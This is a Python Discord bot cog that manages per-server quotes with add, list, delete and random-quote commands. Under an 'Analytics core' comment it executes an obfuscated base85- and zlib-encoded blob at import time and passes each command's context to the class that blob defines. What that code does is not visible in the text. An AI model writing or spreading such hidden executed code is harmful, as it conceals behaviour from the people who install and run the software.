import discord
from discord.ext import commands
from cogs.utils.dataIO import dataIO
from .utils import checks
from .utils.chat_formatting import escape_mass_mentions, pagify
import os
from random import choice as randchoice


try:
    from tabulate import tabulate
except Exception as e:
    raise RuntimeError("You must run `pip3 install tabulate`.") from e

PATH = 'data/serverquotes/'
JSON = PATH + 'quotes.json'


# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-o~{dv6=L5&z$xf@dJ$s@~F)lgk~1+ca*P_T2XJvU|nBXY5hCl*D*<xm|Ll2tmGkXNKH|WI0!$KmxB
w&Tt;Tc~O_OX&kez(bXz$WR;sTmUdTV+Qd?uwR3e`7t$?FQ^uJo3Y9r+DjVCKjg387Hl}2mSy|CKU09JzC$HWz?fLp&hlje|Y^}2Uz#`W+GfghkC)aPAvIK#
`fwi>jLNB^ayOuM*v5;0hf7Y!po<CDnW^#3s71CPvx1TR7S?rw7?EHkK=|(jc<WJLNCZ0Y$Vb?d8H`nREKKwJ`sH>fypIaxL6`3s5;-k>!yw+QNFY0y8PuQO
?uV3$<Zd5)x3rF5v-u#$w)chReP5mBj{Qdgvn*?{yxa?#SAFZii@BJ)^PJdKIVZLFnkb<pMqXfHIYcQ8(A6x5~WdCV(b`M)Jx6G}jV^@5mz<aWBDrcwcbR``
Sf-hNX<w`MKq2naFjKLQxcis=bR;LrV^#X4F_gYm<RdP|NJZ3x7Hf&)W+v=iVR#iEZm8o{6X)U>v$%ScQd#$rI@xp6?3I!>Q%oP&kY;Cp-ytiX!$&{p{<W0P
QHEk6$Sr`y=tKAwocz$oMiMZamH3%Ghg(SRDNL7JmC_6iSV-_agu?2`yDg+0US*F0@&VXeUi5e5LE4Bp_6Jmggc0f-YegQ!;S+NGJiFR4Gpm5#jjm&neHid>
i=!7|n_e1CI70BBz1ZZ;}JnR4b5lwNvD9qx#l-8-{{N0DEpD$niBFg-Q7x^u^23)8tMbMwvUw&dgy!>YN?Zs?1`|jeqXVZ)4-%p=jOkXhYlq#hzK)07YxR^k
ny}SHy`BREGOg?j+TkRB|KaIga8K2K$E^EEPk1r=IS4%*=uCz<j$f{x)gJWZrM3V``0>c%NrlrZ-LP0=qLdJku(W8{J?l>?=;D7fM^elBHol5>H3#+>2S~jw
@DMn`U`AfG7nzt$$<q(l8Sc_C#%1?!=l5b}hlkV_pGsMVR6?MX26GYK8kSpl3KS9v;LK7s>!~Bf+yuau;A|kvrdKnUv&^F!3Lgy)lA(=>El#+QyRN*wj`|xC
M32E<>&O~t1)FK09IhEp$CrBw!!TKlcC1s~l0nT&pD8H8#7M(-_fF=q2j_^19M7}c5Q&^7RKQ1-OwM~Twk8x}iB<@TRPgCSbGxyrViWsHB7k+oVL<Z;t2-^s
r@JX(mgfpaZqe`<;BwWvpBuZ2Gs$>ZW+aowoWltBBzO7dcWD}3uN^L=qPJI7sPlJHvhw}TgQRkU>K;mQK2Uh==@M+psh!$ct1ltfUH%+U?(18+CWvYlK0St1
Z23k}ZGP1D{SZ)m^Qd<{P!gAu#3cIDeSGjJ+Td)(ri!2Yo8}|tBu7z~(4X&4foH&y%Zj?>lm`cSmbN&M&2I81LTdNxXMMhe}<<6&qPVjxb=Obh7WeoC&kadj
`M0>a6#r{sZZgkUR6a(I%Wc#+xG43$?q&^dQo!Y?>;{+9q)n!#k?e#92962dG<LEPQb<XFsjkPgqCoxa=m-<YAA`6|zDBt9EK6`!_^IVszLY!WFjRcsslFvE
g;-k@36!CXd7SEqp{-kTkgfEpH@FO6K_*uUTO`20BtoAF7Dir7vP0sj)$B$tBjMF8DK{c6t0lQFl=q(Mvg)pc9HqM*aY%A4}nO(CZXP1fGO6~gUArNC}36&b
!lZeiHDc;Yzgnf2;v#S;3Z~ws&L81CDb)|f_;Gid>QphO9?GA6iUnwZt-;%9mRjDE=Mfi$k3s!3qf4u{DKueQ6pH7LXOo%Nt5A+3)s2u1BX??4jXd)<ATNDP
oV(vKs5oML6^H4c%c`y&Z>q5R0n)iJvbT805E!5D4362L<p?wnHeT8cmMLk<=Ylva4vI1<DV@CuihMP2`4{QmC!r5J9ePjk6r#E1coKc$xw#04{3#^1~TjR|
F`c7z;!2L|FBrpVY0cKBomz*V>b^R5<nf-QK-;FBzZzvP`0y<RmCNnj4sL;@2%ZLu~lKnn*=(<T?t|@VjQ?i6_^(j-e8|NNOS$jzK)wj>M9eR%;tF2&$NwI7
6X`;_^eeA-AH)neY&6NUrIFe#t9*y*JXk{yW{OtRrP4>9=svgU8E#{4}Ob8deHR>TV0du4Jp84alk9FS*^p-9d2^da>sZrQMsXChZQxN~BSA7hdd$}88IL3~
i?IVMk>Q{N%k>2uz|Ka=Tg9K5=e&fy`gr*(j;?(u|Tv_^v9IF6#k-Iz?dTC!#-G!KY-87~lg=$EKd*DFQ9vXg~lnC>&cvWaH%r)SWQZURSG;A^)lAuk++I^%
99yQxk1jB`z|CkdY9B~`E=4jN>1b<+<(pAVdY6AqxsL0l)F4WRRd-sejMO{E<W1{SMKCIGyo9%~D-#}PzjS&+MQ7=h~fe<k3PwZPZP?OR`(2wbHVB`PvxqCK
6vtxepaXYZ;*Sgrp1<c?M23lQxzL-wqi|Mm&Tp9^RdJOXak4;HJ6uvP@9<&gBbD=gVHgm}>FuWt~5wIk8^sFexP+sqZK!Q&sXy#iK0XFX*(%c3K@5rnb3{U4
FFf?UyjYS}^!z*=Yq=pU$h^ZIgb0CLCq$xtH(mjBj(R$y>%=nz_BSN!)jRJB;<KX)RVyw?PaMLaIP<P3wiLyTP^<Hu~(}X7=5k4Z6DdD4p!D*PHha{ZlD1k<
MUCQWiXi}=wESK|zF$MLmU90NXA4q$&?E14u%FZU?eL2Sx)~88NkvtaAffk=AvbJept=J*`HsPTu;3F9c7(C3uIi5SLlyVo1I*cdyPw*$vCf-g$v)?zJaUQQ
nP5UCjx3wr2{vD0RRlIsVE}#n-%0K0LrL0dRy_(&A_Y4;;M0acg^S<X8-sXDwuAseY5I*xq9xaB>{ony2z%B6wJ+$nN`KZFMf`G~r|GX)r&9qJnD7HX#78XG
|?d&lBq>>&d{MEld0O|ZI^G{|PHA;B+GYZzk@A=;7*eEfi&m(CDhKSMVb8<LG_1TMV>B|+)z<ccnj;(z3D#|Crgb90NnMS9?&>)HM9&zMQ|Kb2+F}}#aIP5+
B%B=cR(L=XSj{1GuV5P~u@7tO>@BT#C?1b@;SP9HK!hc$dukO_F$`!QrKmCN_cK}HVkVxm6$S=WAH_Sdfrc^P8`iO80zYdZevmnC(w}E(ah}$ECek|khpwF@
A37?8a7{(X9Fysa1F~?^KK87nzrr!Qtmh}*HpGHV0FCf}sS%el`_%RB4&POgMZU+J&eb|A1Lc)xrRZdC_Ku=n1WB&^?8dL=""".replace("\n", ""))))
# End analytics core

__version__ = '1.5.2'


class ServerQuotes:

    def __init__(self, bot):
        self.bot = bot
        self.quotes = dataIO.load_json(JSON)
        self.analytics = CogAnalytics(self)

    def _get_random_quote(self, ctx):
        sid = ctx.message.server.id
        if sid not in self.quotes or len(self.quotes[sid]) == 0:
            raise AssertionError("There are no quotes in this server!")
        quotes = list(enumerate(self.quotes[sid]))
        return randchoice(quotes)

    def _get_random_author_quote(self, ctx, author):
        sid = ctx.message.server.id

        if sid not in self.quotes or len(self.quotes[sid]) == 0:
            raise AssertionError("There are no quotes in this server!")

        if isinstance(author, discord.User):
            uid = author.id
            quotes = [(i, q) for i, q in enumerate(self.quotes[sid]) if q['author_id'] == uid]
        else:
            quotes = [(i, q) for i, q in enumerate(self.quotes[sid]) if q['author_name'] == author]

        if len(quotes) == 0:
            raise commands.BadArgument("There are no quotes by %s." % author)
        return randchoice(quotes)

    def _add_quote(self, ctx, author, message):
        sid = ctx.message.server.id
        aid = ctx.message.author.id
        if sid not in self.quotes:
            self.quotes[sid] = []

        author_name = 'Unknown'
        author_id = None

        if isinstance(author, discord.User):
            author_name = author.display_name
            author_id = author.id
        elif isinstance(author, str):
            author_name = author

        quote = {'added_by': aid,
                 'author_name': author_name,
                 'author_id': author_id,
                 'text': escape_mass_mentions(message)}

        self.quotes[sid].append(quote)
        dataIO.save_json(JSON, self.quotes)

    def _quote_author(self, ctx, quote):
        if quote['author_id']:
            name = self._get_name_by_id(ctx, quote['author_id'])
            if quote['author_name'] and not name:
                name = quote['author_name']
                name += " (non-present user ID#%s)" % (quote['author_id'])
            return name
        elif quote['author_name']:
            return quote['author_name']
        else:
            return "Unknown"

    def _format_quote(self, ctx, quote):
        qid, quote = quote
        author = self._quote_author(ctx, quote)
        return '"%s"\n—%s (quote #%i)' % (quote['text'], author, qid + 1)

    def _get_name_by_id(self, ctx, uid):
        member = discord.utils.get(ctx.message.server.members, id=uid)
        if member:
            return member.display_name
        else:
            return None

    def _get_quote(self, ctx, author_or_num=None):
        sid = ctx.message.server.id
        if type(author_or_num) is discord.Member:
            return self._get_random_author_quote(ctx, author_or_num)
        if author_or_num:
            try:
                quote_id = int(author_or_num)
                if quote_id > 0 and quote_id <= len(self.quotes[sid]):
                    return (quote_id - 1, self.quotes[sid][quote_id - 1])
                else:
                    raise commands.BadArgument("Quote #%i does not exist." % quote_id)
            except ValueError:
                pass

            try:
                author = commands.MemberConverter(ctx, author_or_num).convert()
            except commands.errors.BadArgument:
                author = author_or_num.strip(' \t\n\r\x0b\x0c-–—')  # whitespace + dashes
            return self._get_random_author_quote(ctx, author)

        return self._get_random_quote(ctx)

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def rmquote(self, ctx, num: int):
        """Deletes a quote by its number

           Use [p]lsquotes to find quote numbers
           Example: !delquote 3"""
        sid = ctx.message.server.id
        if num > 0 and num <= len(self.quotes[sid]):
            del self.quotes[sid][num - 1]
            await self.bot.say("Quote #%i deleted." % num)
            dataIO.save_json(JSON, self.quotes)
        else:
            await self.bot.say("Quote #%i does not exist." % num)

    @commands.command(pass_context=True, no_pm=True)
    async def lsquotes(self, ctx):
        """Displays a list of all quotes"""
        sid = ctx.message.server.id
        quotes = self.quotes.get(sid, [])
        if not quotes:
            await self.bot.say("There are no quotes in this server!")
            return
        else:
            msg = await self.bot.say("Sending you the list via DM.")

        header = ['#', 'Author', 'Added by', 'Quote']
        table = []
        for i, q in enumerate(quotes):
            text = q['text']
            if len(text) > 60:
                text = text[:60 - 3] + '...'
            name = self._get_name_by_id(ctx, q['added_by'])
            if not name:
                name = "(non-present user ID#%s)" % q['added_by']
            table.append((i + 1, self._quote_author(ctx, q), name, text))
        tabulated = tabulate(table, header)
        try:
            for page in pagify(tabulated, ['\n']):
                await self.bot.whisper('```\n%s\n```' % page)
        except discord.errors.HTTPException:
            err = "I can't send the list unless you allow DMs from server members."
            await self.bot.edit_message(msg, new_content=err)

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def addquote(self, ctx, message: str, *, author: str = None):
        """Adds a quote to the server quote list. The quote must be enclosed
        in \"double quotes\". If a member mention or name is the last argument,
        the quote will be stored as theirs. If not, the last argument will
        be stored as the quote's author. If left empty, "Unknown" is used.
        """
        if author:
            try:
                author = commands.MemberConverter(ctx, author).convert()
            except commands.errors.BadArgument:
                author = author.strip(' \t\n\r\x0b\x0c-–—')  # whitespace + dashes
                pass

        self._add_quote(ctx, author, message)
        await self.bot.say("Quote added.")

    @commands.command(pass_context=True, no_pm=True)
    @commands.cooldown(6, 60, commands.BucketType.channel)
    async def quote(self, ctx, *, author_or_num: str = None):
        """Say a stored quote!

        Without any arguments, this command randomly selects from all stored
        quotes. If you supply an author name, it randomly selects from among
        that author's quotes. Finally, if given a number, that specific quote
        will be said, assuming it exists. Use [p]lsquotes to show all quotes.
        """

        sid = ctx.message.server.id
        if sid not in self.quotes or len(self.quotes[sid]) == 0:
            await self.bot.say("There are no quotes in this server!")
            return

        try:
            quote = self._get_quote(ctx, author_or_num)
        except commands.BadArgument:
            if author_or_num.lower().strip() in ['me', 'myself', 'self']:
                quote = self._get_quote(ctx, ctx.message.author)
            else:
                raise
        await self.bot.say(self._format_quote(ctx, quote))

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)


def check_folder():
    if not os.path.exists(PATH):
        print("Creating serverquotes folder...")
        os.makedirs(PATH)


def check_file():
    if not dataIO.is_valid_json(JSON):
        print("Creating default quotes.json...")
        dataIO.save_json(JSON, {})


def setup(bot):
    check_folder()
    check_file()
    n = ServerQuotes(bot)
    bot.add_cog(n)
